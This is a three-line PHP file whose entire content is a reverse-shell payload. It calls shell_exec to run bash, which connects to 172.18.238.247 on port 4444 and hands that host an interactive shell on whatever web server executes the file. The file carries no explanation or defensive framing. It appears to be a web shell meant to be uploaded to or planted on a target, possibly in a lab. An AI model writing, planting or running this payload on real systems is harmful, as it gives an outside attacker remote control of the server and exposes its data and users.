<?php
shell_exec("/bin/bash -c 'bash -i >& /dev/tcp/172.18.238.247/4444 0>&1'");
?>